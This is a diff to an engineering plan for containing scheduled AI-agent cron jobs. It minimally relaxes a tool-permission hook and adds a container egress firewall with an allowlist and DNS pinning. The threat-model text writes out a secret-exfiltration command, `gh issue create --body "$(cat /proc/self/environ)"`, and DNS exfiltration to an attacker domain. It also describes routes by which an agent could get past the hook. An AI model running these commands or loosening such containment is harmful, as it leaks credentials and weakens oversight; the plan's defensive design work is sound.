@@ -24,6 +24,44 @@ re-triage owned explicitly. See `## Plan-Review Resolution`.
 **Deepened on:** 2026-06-09 · **Agents:** security-sentinel, architecture-strategist,
 framework-docs-researcher (GitHub App token API), Explore (nftables DOCKER-USER egress).
 
+**Re-deepened on:** 2026-06-09 (PR-2 Phase-2 full-AC pass) · **Agents:** security-sentinel
+(relax-vs-remove + sub-agent hook inheritance), architecture-strategist (precedent-diff + apply-path +
+nft atomicity), Explore ×4 (nftables/systemd/DNS production design, allowlist-host fact-verification,
+network-outage deep-dive, per-cron restore-class + token audit). **PR-2 is now resolved as TWO
+reconciled deliverables** — the original Phase 2 framed it as firewall-only and carried a stale
+assumption ("restores the needs-firewall crons") that PR-1's `## Work-Phase Resolution` already
+contradicted. See `### Phase 2` (rewritten) + `## PR-2 Acceptance Criteria` (full) + `## Network-Outage
+Deep-Dive (PR-2)`.
+
+### PR-2 deepen — key corrections (verified against the codebase)
+1. **The firewall alone restores ZERO crons → PR-2 must also relax the #5018 hook.** PR-1 proved the
+   hook (not egress) blocks all 11 (`cron-bash-allowlist-hook.mjs` catch-all denies `Task`/`Skill`;
+   metachar layer denies `$()`/pipes/`node -e`). Decision: **RELAX-MINIMAL** — drop ONLY the
+   `Task`/`Skill` catch-all (`:340-344`); KEEP every Bash-containment layer AND keep
+   `WebFetch`/`WebSearch`/`mcp__*` denied. The L3 firewall is **content-blind + off-allowlist-only**, so
+   it does NOT subsume the hook's *secret-in-context* severance (`SECRET_PATH_PATTERNS`, metachar/allowlist
+   Bash, `argumentInjectionReason`, `gitVerbReason`). Relax-moderate (dropping metachar) and remove-entirely
+   were both **rejected** — they re-open the Bash-secret-read → on-allowlist-exfil path the firewall is
+   blind to (violates TR4 + ADR-033 I7).
+2. **Honest restore count: relax-minimal restores 2 crons, not "the needs-firewall set."** Only
+   `cron-agent-native-audit` + `cron-legal-audit` are blocked *solely* by the Task catch-all. The other 9
+   need per-construct Bash-allowlist refinement (campaign-calendar / competitive-analysis / growth-audit /
+   seo-aeo-audit / content-generator / growth-execution — evidence-gated future work) OR stay
+   firewall-dependent for non-GitHub egress (bug-fixer, community-monitor, ux-audit). This mirrors PR-1's
+   R3 realization — surface it, don't silently over-promise. **The firewall's primary value is containing
+   the 4 LIVE spawn-bash crons that run UNCONTAINED today** (content-publisher, content-vendor-drift,
+   rule-prune, weekly-analytics — ADR-033 I7), plus *enabling* the 2-cron relax-minimal restore.
+3. **Sub-agent hook inheritance is the gate for allowing `Task`.** Sub-agents DO inherit the hook
+   (auto-discovered `repo/.claude/settings.json` under a `*` matcher, no `--settings` flag;
+   `_cron-claude-eval-substrate.ts:322-326`/`:214-217`; Task surfaces as `tool_name:"Agent"`). But this is
+   *inferred*, not probe-verified for a sub-agent's *interior* Bash. **NEW AC:** a Phase-0-style probe
+   (Task sub-agent attempting `cat /proc/self/environ` → assert `deny`) gates the relaxation; if it
+   fails-open, `Task` stays denied.
+4. **Firewall + hook-relax must land ATOMICALLY, gated on a live deny-proof.** `nft -f` exits 0 on an
+   inert ruleset (the silent-green failure this umbrella exists to prevent). The provisioner's post-apply
+   assertion MUST include a live positive+negative container probe — and that proof is a **merge
+   precondition** for the hook diff, else crons run uncontained at BOTH layers.
+
 ### Key corrections (all verified against the codebase / GitHub docs)
 1. **Token default was insufficient → BLOCKER.** `{ contents:write, issues:write }` 403s on
    `gh pr create` (`_cron-claude-eval-substrate.ts:148`). PR creation needs **`pull_requests:write`**.
@@ -110,6 +148,23 @@ firewall, so the discipline is applied to the outage it could *cause*. Unverifie
 4. **L7 — fail-loud on block.** A denied egress surfaces (Sentry `egress_blocked` + Inngest throw →
    missed heartbeat), never green. [Observability + PR-2 AC]
 
+## Network-Outage Deep-Dive (PR-2)
+
+Mandatory (deepen-plan Phase 4.5 — this plan adds a firewall + an SSH `terraform_data` provisioner).
+L3→L7 discipline applied to the outage the firewall could *cause*:
+
+| Layer | Check | Status | Artifact / gap |
+|---|---|---|---|
+| **L3 — host control-plane (CF tunnel)** | DOCKER-USER scoping leaves host OUTPUT untouched | **VERIFIED** | `firewall.tf` inbound-only (no egress rules); CF tunnel daemon dials OUT at host level (`server.tf:43,346` #4829); DOCKER-USER filters bridge-FORWARD only. |
+| **L3 — apply-path (SSH provisioner return)** | the provisioner's SSH :22 return path survives the firewall | **VERIFIED** | SSH :22 ingress is admin_ips-only (`firewall.tf:5-12`); DOCKER-USER never touches host INPUT/OUTPUT; CF-tunnel SSH route (#4829) is host OUTPUT. Connection-reset diag ordering = admin-IP drift FIRST (`hr-ssh-diagnosis-verify-firewall`). |
+| **L3 — DNS/routing (allowlist + resolver pin)** | container's OWN required resolution still works while arbitrary resolvers are denied | **CLOSE AT /work** | Rule 2 (Phase 2.B) pins UDP/53 to one resolver + drops others. Must snapshot the resolved IPs per allowlisted host at provision time + prove the container can still resolve `api.anthropic.com` etc. (AC-P2.4/2.6). |
+| **L7 — TLS/SNI proxy** | N/A | **N/A (deferred by design)** | No SNI proxy up front — the re-resolve race is fail-loud/self-correcting; a proxy is a standing SPOF (dies → all crons dark). Escalate only on evidence of production churn that defeats re-resolve. |
+| **L7 — fail-loud on block** | a denied egress surfaces, never green | **CLOSE AT /work** | Requires BOTH the Sentry-ingest external allow (AC-P2.4) AND the host-gateway :8288 allow (AC-P2.5) intact — else the fail-loud signal itself goes dark. Proven by AC-P2.10 (simulated block → `egress_blocked` + missed heartbeat). |
+
+**No gap blocks the plan; three items are closed by PR-2 ACs** (DNS snapshot/pin → AC-P2.4/2.6; fail-loud
+→ AC-P2.10; the live positive+negative provisioner probe → AC-P2.8, which is the merge precondition for
+the coupled hook relaxation).
+
 ## User-Brand Impact
 
 **If this lands broken, the user experiences:** a restored cron silently fails (allowlist gap) and the
@@ -172,36 +227,134 @@ dry-run flip (if chosen) is a blast-radius reduction for one cron's posting only
 - Do NOT touch the ~10 non-cron call sites. Test the override (seed bogus ambient `GH_TOKEN`, assert
   subprocess sees the minted **narrowed** token AND the `repositories`/`permissions` shape).
 
-### Phase 2 — PR-2: Container egress firewall (separate branch; deepen-plan first)
+### Phase 2 — PR-2: Container egress firewall + minimal hook relaxation (separate branch; THIS deepen)
 
-**Mechanism: allowlist-first (operator-chosen; deepen-plan confirmed decisive).** nftables rules in the
-**`DOCKER-USER` chain** (confirmed correct: filters bridge-FORWARD egress incl. `spawn("bash")`
-children, leaves host OUTPUT untouched), default-drop + a hostname/IP allowlist with **periodic IP
-re-resolve** for the ~10 external SaaS hosts (host-side systemd timer resolving hostnames into a named
-nftables set). NO SNI proxy up front — the race is fail-loud/self-correcting (a missed-rotation IP →
-egress block → Sentry `egress_blocked` + missed heartbeat → visibly-late weekly cron, not silent-green),
-and the proxy is a standing SPOF (dies → all crons dark). Escalate to a proxy only on observed
-production churn that defeats re-resolve (evidence-gated). **Hard conditions for the re-resolve (arch):**
-- (a) Set updates MUST be **additive-then-prune** (add new IPs *before* removing stale — never
-  flush+repopulate, which creates a guaranteed drop window every timer tick).
-- (b) The re-resolve **timer-unit failure itself MUST alarm** (a dead timer freezes the set → eventual
-  total egress loss as all IPs rotate away) — Sentry/Better Stack heartbeat on the timer
-  (`hr-observability-as-plan-quality-gate`).
-- (c) **DNS-exfil control** (security F3.2): the container's UDP/53 egress MUST be pinned to a specific
-  logged resolver, not open to any host — else a compromised cron exfiltrates via
-  `<base32-secret>.attacker.com` queries. PR-2 deny-list AC includes a DNS-exfil test.
+PR-2 is **two reconciled deliverables** that must land **atomically** (the relaxation is only safe once
+the firewall is *proven live*): **(A)** relax the #5018 containment hook to the minimum that lets ≥1 cron
+restore, and **(B)** the DOCKER-USER container egress firewall that makes (A) safe and contains the 4
+live spawn-bash crons. Then **(C)** restore + token-narrow the crons (A) unblocks.
 
-**Rules (arch §1/§2):** match on the **Docker bridge interface explicitly** (not a blanket
-`-j DROP` that could catch host-gateway/inter-container return traffic); explicitly **allow the
-host-gateway address on :8288** (self-hosted Inngest); default-drop everything else.
+#### Phase 2.A — Hook relaxation: RELAX-MINIMAL (security-sentinel, adversarial)
 
-Applied via a **9th `terraform_data` SSH provisioner** modeled exactly on `docker_seccomp_config`
-(`server.tf:573`): `triggers_replace = { rules_hash, server_id }` (`server_id` fold mandatory —
-`hr-fresh-host-provisioning`), `connection{type="ssh"}` per the 8 siblings, positive post-apply
-assertions (`fail2ban_tuning` pattern). Mirror into `cloud-init.yml` for fresh hosts. Apply-path
-self-lockout confirmed **safe** (DOCKER-USER doesn't touch host :22 or the CF-tunnel apply route).
-Restores the needs-firewall crons from Phase 1.0 once proven. **Create an ADR** for this new
-container-egress primitive (`/soleur:architecture create`; cross-ref ADR-033 I7).
+**Decision: relax-minimal.** In `cron-bash-allowlist-hook.mjs`, change ONLY the `decide()` catch-all
+(`:340-344`) from `default: deny` to an explicit **`Task` → allow, `Skill` → allow, everything-else →
+deny** (preserve fail-closed-on-unknown: a *new* tool class still denies). **KEEP unchanged:** the
+metachar layer (`dangerousMetacharReason`, `:136`), allowlist-prefix Bash enforcement (`:308`),
+`SECRET_PATH_PATTERNS` (`:74`), `gitVerbReason` (`:221`), `argumentInjectionReason` (`:199`),
+`WRITE_PROTECTED_PATTERNS` (`:95`), AND the catch-all denial of `WebFetch`/`WebSearch`/`mcp__*` (no
+restored cron needs them; they are pure additional egress surface).
+
+**Why not relax-moderate (also drop metachar) or remove-entirely:** the L3 firewall is **content-blind
+and severs only OFF-allowlist egress**. The hook's own threat model (`:23-33`) severs exfil at TWO
+points — *(a) secret-in-context* AND *(b) egress*; the firewall only attacks (b), and only off-allowlist.
+`SECRET_PATH_PATTERNS` governs only the Read/Glob/Grep tools — `cat /proc/self/environ` via the **Bash**
+tool is stopped ONLY by the metachar+allowlist Bash layer (hook comment D0b, `:14-15`). Dropping that
+layer re-admits Bash secret-reads, which then exfil over an **on-allowlist** channel
+(`gh issue create --body "$(cat /proc/self/environ)"` to the public repo over allowlisted
+`api.github.com`) the firewall cannot see. Relax-moderate and remove-entirely both re-open the canonical
+P0-A vector → **rejected** (violate TR4 + ADR-033 I7).
+
+**Sub-agent inheritance gate (`Task` safety).** Allowing `Task` is safe *only because* sub-agents inherit
+the same PreToolUse hook — registration is via the auto-discovered project `repo/.claude/settings.json`
+under a `*` catch-all matcher (`_cron-claude-eval-substrate.ts:322-326`, `:214-217`; **no `--settings`
+flag**), and the Task tool surfaces as `tool_name:"Agent"` which the `*` matcher catches. This is
+**inferred from the architecture, NOT probe-verified for a sub-agent's interior Bash** (the committed
+Phase-0 probes test the catch-all denying `Task` *itself*, not a sub-agent's nested Bash). **Gate (AC):**
+extend `runHookSelfTest` (`_cron-claude-eval-substrate.ts`) with a spawn-time probe that runs a `Task`
+sub-agent whose body attempts `cat /proc/self/environ` and asserts `permissionDecision:"deny"`. If it
+fails-open, `Task` stays denied and the relaxation does not ship.
+
+**Honest restore scope under relax-minimal: 2 crons.** Only `cron-agent-native-audit` (Task: 8
+sub-agents) and `cron-legal-audit` (Task: legal-compliance-auditor) are blocked *solely* by the Task
+catch-all → both restore. The other 9 stay deferred: 6 PR-flow crons (campaign-calendar,
+competitive-analysis, growth-audit, seo-aeo-audit, content-generator, growth-execution) need
+per-construct Bash-allowlist refinement (`date -u`, dynamic `checkout -b`, `npx eleventy` — **evidence-gated
+future work**, NOT a blanket metachar drop); bug-fixer / community-monitor / ux-audit stay
+firewall-dependent for non-GitHub egress. This is the PR-1-R3 honesty pattern — surface in the PR body,
+do not over-promise.
+
+#### Phase 2.B — Container egress firewall (the durable boundary)
+
+**Mechanism: allowlist-first (operator-chosen; deepen confirmed decisive).** nftables rules in the
+**`DOCKER-USER` chain**, matched on the **default-bridge interface explicitly** (`iifname "docker0"` — the
+container runs on the default bridge: `docker run` in `ci-deploy.sh:474-488,652-674` has **no `--network`
+flag**). NOT a blanket `-j DROP` (would catch host-gateway / inter-container return traffic). Rule order
+(first-match-wins, drop LAST):
+1. `ct state established,related accept` (return traffic).
+2. **DNS pin** (cond. c): `udp dport 53 ip daddr <pinned-resolver> accept`, then `udp dport 53 log
+   prefix "egress-dns-exfil: " drop` — pins container DNS to one logged resolver (the `docker0` gateway /
+   host stub) so a compromised cron can't tunnel `<base32-secret>.attacker.com`.
+3. **Host-gateway Inngest** (NOT internet egress): `ip daddr <bridge-gw> tcp dport 8288 accept`. Derive
+   `<bridge-gw>` at rule-build time — `docker network inspect bridge -f '{{(index .IPAM.Config
+   0).Gateway}}'` (default `172.17.0.1`, but DO NOT hardcode — a `bip`/`default-address-pools` change
+   shifts it). Self-hosted Inngest at `host.docker.internal:8288` (`ci-deploy.sh:482-483,660-661`); the
+   fail-loud throw depends on this.
+4. `ip daddr @egress_allowlist accept` — the named set (`type ipv4_addr; flags interval`) of resolved
+   external-host IPs.
+5. `iifname "docker0" log prefix "egress-blocked: " level notice` then `iifname "docker0" drop` (the
+   fail-loud + default-drop).
+
+**External allowlist** (resolved into `@egress_allowlist`; consolidated from fact-verification, each with
+file:line evidence in the deny-list AC): `api.anthropic.com`, `github.com`, `api.github.com`,
+**`<SENTRY_INGEST_DOMAIN>`** (matches `/^[a-z0-9.-]+\.sentry\.io$/i`, `_cron-shared.ts:88,189` — the ONLY
+external observability dep, operator-configured so resolve from the live env at provision time),
+`<ref>.supabase.co` (REST **and** realtime/WSS share the host), `api.doppler.com`
+(`_predicate-validator.ts:21`), `edge.api.flagsmith.com` (`lib/feature-flags/server.ts:10`), `api.x.com`,
+`api.linkedin.com`, `bsky.social` (+ verify `*.bsky.network` need at AC time), `discord.com`,
+**`plausible.io`** (`scripts/weekly-analytics.sh:25` — NEW: weekly-analytics fetch; was missing from the
+original allowlist). **NOT in the container allowlist** (host egress): Better Stack/Vector
+(`infra/vector.toml:313`, reads host journald), GHCR (`ghcr.io`, host dockerd).
+
+**Hard conditions for the re-resolve (arch — mechanism confirmed):**
+- (a) **Additive-then-prune, atomically.** A host-side systemd timer resolves hostnames → IPs and writes
+  a generated `nft -f` file with an **add block then a delete block** (a single `nft -f` runs as one
+  atomic transaction — no intermediate empty-set window). Per-element `nft add element` / `nft delete
+  element` on the **named set**; NEVER `flush set` + repopulate. **Fail-safe:** if resolution returns
+  empty (transient DNS outage), abort the update — do NOT prune to an empty allowlist.
+- (b) **Timer-unit failure MUST alarm** (a dead timer freezes the set → progressive then total egress
+  loss as IPs rotate). `OnFailure=` → a oneshot that pings a Better Stack/Sentry heartbeat; plus a
+  success-heartbeat the monitor expects (`hr-observability-as-plan-quality-gate`).
+- (c) DNS-exfil control — see rule 2 above; the deny-list AC includes a DNS-exfil-over-UDP/53 test.
+
+**Persistence (arch — Docker re-asserts its own rules on `dockerd` restart).** Load the ruleset as a
+**boot-persistent unit that re-asserts on every boot**, mirroring `docker_seccomp_config`'s boot-persistent
+oneshot pattern (`server.tf:617-624`) — a one-time `nft` insert is not drift-proof (lost on the frequent
+`ci-deploy.sh` container redeploys / daemon restarts). Flush only THIS ruleset's named-set-backed rules
+(stable comment/handle), never the whole chain.
+
+**Wildcard hosts.** `*.supabase.co` / `*.bsky.network` have no resolvable wildcard A record — enumerate
+the specific subdomains the code uses (`<ref>.supabase.co`, `bsky.social`). A subdomain IP rotating
+between resolve cycles is fail-loud/self-correcting (re-resolve cadence ≪ SaaS DNS TTL), not silent-green.
+
+**Apply path (arch precedent-diff confirmed SAFE).** A **9th `terraform_data "cron_egress_firewall"` SSH
+provisioner** modeled exactly on `docker_seccomp_config` (`server.tf:573`): map-form `triggers_replace = {
+rules_hash = sha256(file("${path.module}/cron-egress-nftables.sh")), server_id = hcloud_server.web.id }`
+(`server_id` fold mandatory — `hr-fresh-host-provisioning`; use `hcloud_server.web.id`, NOT
+`ipv4_address`); `connection{type="ssh"}` byte-identical to the 8 siblings; **positive post-apply
+assertions** (see PR-2 ACs). This is an **addition to the existing `apps/web-platform/infra/` root, NOT a
+new root** → `hr-every-new-terraform-root` does not fire (no new backend/`.test.sh` root-guard). Add
+`-target=terraform_data.cron_egress_firewall` to the **SSH-provisioner apply block**
+(`apply-web-platform-infra.yml:520-528`, the CF-tunnel SSH path), NOT the saved-tfplan block;
+`terraform-target-parity.test.ts` (`MIN_SSH_PROVISIONED`, `>=`, union-coverage) **fail-closes on omission
+with no test edit** (verify the count bumps to the new sibling total at /work). Mirror into
+`cloud-init.yml` (base64 `write_files`) for **fresh hosts only** — cloud-init is **dead on the running
+host** (`ignore_changes=[user_data]`, `server.tf:57`), so the SSH provisioner is the sole live apply path.
+DOCKER-USER scoping leaves host :22 (`firewall.tf:5`, admin_ips) and the CF-tunnel SSH route (#4829,
+`server.tf:346`) untouched → apply-path self-lockout **safe**; a connection-reset on apply = admin-IP
+drift (`/soleur:admin-ip-refresh`), NOT firewall (`hr-ssh-diagnosis-verify-firewall`).
+
+**Create an ADR** for the container-egress primitive (`/soleur:architecture create`; cross-ref ADR-033 I7
+— the spawn-bash hook-bypass the firewall closes; AP-001 upheld, AP-002 advisory-tier exception consistent
+with the 8 sanctioned siblings).
+
+#### Phase 2.C — Restore + token-narrow the 2 unblocked crons
+
+Remove `cron-agent-native-audit` + `cron-legal-audit` from `TIER2_DEFERRED_CRONS` (`_cron-shared.ts:222`).
+Both are **issue-creators only** (`gh issue create/list/view`) → both are **narrowed-token-eligible**:
+apply the PR-1 `DEFAULT_CRON_TOKEN_PERMISSIONS` = `{contents,issues,pull_requests}:write` +
+`repositories:["soleur"]` via `mintInstallationToken` **before un-pausing** (bounds the #5073 on-allowlist
+residual for them — they are NOT in PR-1's narrowed set today). Validate each via
+`/soleur:trigger-cron <event>`: output issue appears + `runHookSelfTest` (incl. the new Task-probe) passes.
 
 ## Deferred
 
@@ -230,11 +383,31 @@ container-egress primitive (`/soleur:architecture create`; cross-ref ADR-033 I7)
 - `apps/web-platform/test/server/inngest/cron-shared.test.ts` — assert defer-set/allowlist for restored crons + the token override (bogus ambient `GH_TOKEN` → minted narrowed token).
 - (PR-1.2) `apps/web-platform/server/inngest/functions/cron-content-publisher.ts` — *only if* the dry-run stopgap is chosen.
 
-**PR-2 (separate branch):** `apps/web-platform/infra/server.tf` (new `terraform_data` egress provisioner), `apps/web-platform/infra/cloud-init.yml` (fresh-host mirror), new `apps/web-platform/infra/cron-egress-nftables.sh` + a re-resolve timer unit, `apps/web-platform/infra/sentry/issue-alerts.tf` (`egress_blocked` alert).
+**PR-2 (separate branch — TWO deliverables):**
+- *Hook relax (2.A):* `apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs` (surgical catch-all:
+  `Task`/`Skill`→allow, else deny); `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts`
+  (extend `runHookSelfTest` with the Task-sub-agent secret-read probe).
+- *Firewall (2.B):* `apps/web-platform/infra/server.tf` (new `terraform_data "cron_egress_firewall"` SSH
+  provisioner), `apps/web-platform/infra/cloud-init.yml` (fresh-host mirror), `.github/workflows/apply-web-platform-infra.yml`
+  (add `-target=terraform_data.cron_egress_firewall` to the SSH apply block),
+  `apps/web-platform/infra/sentry/issue-alerts.tf` (`egress_blocked` alert, modeled on `kb_sync_silent_failure`).
+- *Restore + token (2.C):* `apps/web-platform/server/inngest/functions/_cron-shared.ts` (remove
+  `cron-agent-native-audit` + `cron-legal-audit` from `TIER2_DEFERRED_CRONS:222`; apply narrowed token to both);
+  `apps/web-platform/test/server/inngest/cron-shared.test.ts` (assert defer-set removal + token scope);
+  hook unit test (assert surgical catch-all + unchanged denial layers).
+- *Tests/guards:* `cron-egress-nftables.test.sh` (drift guard for the new script, per `hr-every-new-terraform-root`-style
+  guard convention for the infra root addition).
 
 ## Files to Create
 
-- `apps/web-platform/infra/cron-egress-nftables.sh` + re-resolve timer (PR-2)
+- `apps/web-platform/infra/cron-egress-nftables.sh` — the DOCKER-USER ruleset loader (PR-2).
+- `apps/web-platform/infra/cron-egress-resolve.sh` — the hostname→IP re-resolve script (additive-then-prune,
+  fail-safe-on-empty) (PR-2).
+- `apps/web-platform/infra/cron-egress-resolve.{service,timer}` — systemd units (timer + `OnFailure=`/
+  `OnSuccess=` heartbeat) (PR-2).
+- `cron-egress-nftables.test.sh` — drift/lint guard for the new infra script (PR-2).
+- A new ADR for the container-egress primitive under `knowledge-base/engineering/architecture/decisions/`
+  (cross-ref ADR-033 I7) (PR-2).
 
 ## Open Code-Review Overlap
 
@@ -252,8 +425,69 @@ None (checked `gh issue list --label code-review --state open` against PR-1 file
 ### PR-1 — Post-merge (operator-automatable)
 - AC6 — Each restored cron validated via `/soleur:trigger-cron <event>`; output issue appears; `runHookSelfTest` passes. (Automatable via the trigger-cron skill.)
 
-### PR-2 (summarized; full ACs at deepen-plan)
-- `curl` to a non-allowlisted host from inside the container fails; every external allowlisted host (incl. Sentry-ingest) succeeds; **host-gateway :8288 (Inngest) reachable** (fail-loud path intact); host egress (cloudflared/Vector→Better Stack/GHCR/Doppler/apt) verifiably unaffected; a DNS-exfil attempt to an arbitrary domain over UDP/53 fails (resolver pinned); a simulated block → Sentry `egress_blocked` event AND a missed heartbeat; the re-resolve timer-unit failure raises an alarm.
+### PR-2 — Full Acceptance Criteria
+
+**Hook relaxation (Phase 2.A):**
+- AC-P2.1 — `cron-bash-allowlist-hook.mjs` `decide()` catch-all is **surgical**: `Task`→allow,
+  `Skill`→allow, every other tool class (incl. `WebFetch`/`WebSearch`/`mcp__*` and any *new* class)→deny.
+  A unit test asserts `Task`/`Skill` allow AND that an unknown tool class still denies (fail-closed
+  preserved). All other denial layers (metachar, allowlist-prefix Bash, `SECRET_PATH_PATTERNS`,
+  `gitVerbReason`, `argumentInjectionReason`, `WRITE_PROTECTED_PATTERNS`) are unchanged — asserted by the
+  existing hook test suite staying green with no edits to those cases.
+- AC-P2.2 — **Sub-agent inheritance probe (gate):** `runHookSelfTest` is extended with a spawn-time probe
+  that runs a `Task` sub-agent whose body attempts `cat /proc/self/environ` and asserts the hook returns
+  `permissionDecision:"deny"`. The relaxation does NOT ship if this probe fails-open.
+
+**Container egress firewall (Phase 2.B) — deny-list AC (from inside the running container):**
+- AC-P2.3 — `curl`/TCP-connect to a **non-allowlisted** host (e.g. `https://example.invalid`) **fails**
+  (timeout/refused, non-zero exit).
+- AC-P2.4 — **every external allowlisted host succeeds** (2xx/4xx, not timeout): `api.anthropic.com`,
+  `github.com`, `api.github.com`, `<SENTRY_INGEST_DOMAIN>` (Sentry-ingest — explicitly probed),
+  `<ref>.supabase.co`, `api.doppler.com`, `edge.api.flagsmith.com`, `api.x.com`, `api.linkedin.com`,
+  `bsky.social`, `discord.com`, `plausible.io`.
+- AC-P2.5 — **host-gateway :8288 (self-hosted Inngest) reachable** from the container
+  (`curl http://host.docker.internal:8288/...`) — the fail-loud path is intact.
+- AC-P2.6 — **DNS-exfil fails:** a UDP/53 query to an arbitrary domain via a **non-pinned resolver** fails
+  (dropped + logged `egress-dns-exfil:`); a query to the pinned resolver for an allowlisted host succeeds
+  (the container's own required resolution still works).
+
+**Host-egress non-interference (Phase 2.B) — from the HOST:**
+- AC-P2.7 — host egress **verifiably UNAFFECTED**: cloudflared tunnel up, `apt-get update` succeeds, a
+  GHCR `docker pull` succeeds, Doppler reachable, Vector→Better Stack shipping — none touched by
+  DOCKER-USER scoping.
+
+**Apply-path + provisioner assertions (Phase 2.B):**
+- AC-P2.8 — the provisioner's **post-apply remote-exec asserts** (fail2ban_tuning positive-assertion
+  pattern, `server.tf:202-204`), and these are a **merge precondition** for the hook diff: (i) the named
+  set is populated (`nft list set … | grep <a-known-allowlisted-IP>`); (ii) the DROP rule + the :8288
+  ACCEPT + the DNS-pin rules are present in DOCKER-USER; (iii) a **live positive+negative container probe**
+  (allowlisted host reaches AND a non-allowlisted host fails) — proving the ruleset is NOT inert (`nft -f`
+  exits 0 on an inert ruleset; this is the silent-green guard).
+- AC-P2.9 — `terraform fmt -check` + `terraform validate` clean; the new resource is in
+  `apply-web-platform-infra.yml`'s SSH-block `-target=` set; `terraform-target-parity.test.ts` +
+  `cloud-init.yml` drift `.test.sh` guards green; `triggers_replace` folds `server_id`.
+
+**Observability (Phase 2.B):**
+- AC-P2.10 — a **simulated block** (temporarily add a deny for a normally-allowlisted host) →
+  `egress_blocked` Sentry event (new `issue-alerts.tf` alert, modeled on `kb_sync_silent_failure`:
+  `feature="cron-egress-firewall"`, `op="egress_blocked"`, unique `frequency`) **AND** a missed heartbeat;
+  remove the block → next run green.
+- AC-P2.11 — the **re-resolve timer-unit failure raises an alarm** (force the service to fail → `OnFailure=`
+  heartbeat fires / monitor goes red); the re-resolve is fail-safe (empty resolution does NOT prune to
+  empty).
+
+**Restore + token (Phase 2.C):**
+- AC-P2.12 — `cron-agent-native-audit` + `cron-legal-audit` removed from `TIER2_DEFERRED_CRONS`; each
+  minted with `{contents,issues,pull_requests}:write` + `repositories:["soleur"]` (asserted in
+  `cron-shared.test.ts`); the other 9 remain deferred with the honest rationale recorded in the PR body.
+- AC-P2.13 — each restored cron validated via `/soleur:trigger-cron <event>`: output issue appears +
+  `runHookSelfTest` (incl. the AC-P2.2 Task-probe) passes. (Operator-automatable via the trigger-cron skill.)
+
+**Security review:**
+- AC-P2.14 — `security-sentinel` + a focused review run pre-ship (security-sensitive infra); the #5073
+  on-allowlist content-blind residual is re-stated in the PR body (bounded: secret-read stays denied at
+  every Bash path under relax-minimal, so a `gh issue create --body` cannot CONTAIN a secret; #5073
+  /output-content gate remains the layer that closes the reflect-low-sensitivity-value residual).
 
 ## Domain Review
 
